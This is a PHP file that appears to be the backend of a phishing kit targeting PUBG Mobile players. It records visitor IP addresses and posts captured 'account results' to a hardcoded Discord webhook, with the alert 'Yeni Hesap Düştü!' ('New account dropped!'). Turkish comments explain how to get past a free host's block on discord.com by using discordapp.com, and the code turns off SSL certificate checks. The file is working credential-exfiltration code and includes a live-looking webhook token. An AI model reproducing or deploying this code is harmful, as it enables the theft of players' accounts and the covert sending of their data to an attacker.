<?php
error_reporting(0);
date_default_timezone_set('Europe/Istanbul'); 

if (!function_exists('getClientIP')) {
    function getClientIP() {
        if (getenv('HTTP_CLIENT_IP')) return getenv('HTTP_CLIENT_IP');
        if (getenv('HTTP_X_FORWARDED_FOR')) return getenv('HTTP_X_FORWARDED_FOR');
        if (getenv('REMOTE_ADDR')) return getenv('REMOTE_ADDR');
        return 'UNKNOWN';
    }
}

if (!function_exists('sendToDiscord')) {
    function sendToDiscord($mesaj) {
        // ORİJİNAL URL
        $webhookurl = "https://discord.com/api/webhooks/1452751466816344106/yan3aGqAd-Pf8gu3LkCqEMinDu_N6KvOB5DpWVrvInVFV5DVZtUcgBUjNHImBcE_XO-G";
        
        // FİLTRE DOLAŞMA TAKTİĞİ (InfinityFree için):
        // Bazı ücretsiz hostlar 'discord.com'u engeller ama 'discordapp.com'u bazen engellemez.
        // Eğer bu da çalışmazsa mecburen hosting değiştirmelisin.
        $webhookurl = str_replace("discord.com", "discordapp.com", $webhookurl);

        $json_data = json_encode([
            "content" => "🚀 **Yeni Hesap Düştü!** @everyone",
            "embeds" => [
                [
                    "title" => "PUBG Mobile Panel Sonucu",
                    "type" => "rich",
                    "description" => $mesaj,
                    "color" => hexdec("3498db"),
                    "footer" => [
                        "text" => "Tarih: " . date('d-m-Y H:i:s'),
                    ]
                ]
            ]
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

        $ch = curl_init($webhookurl);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        
        // SSL Hatalarını Yoksay (Ücretsiz hostlarda sertifika sorunu olabiliyor)
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

        $response = curl_exec($ch);
        curl_close($ch);
    }
}
?>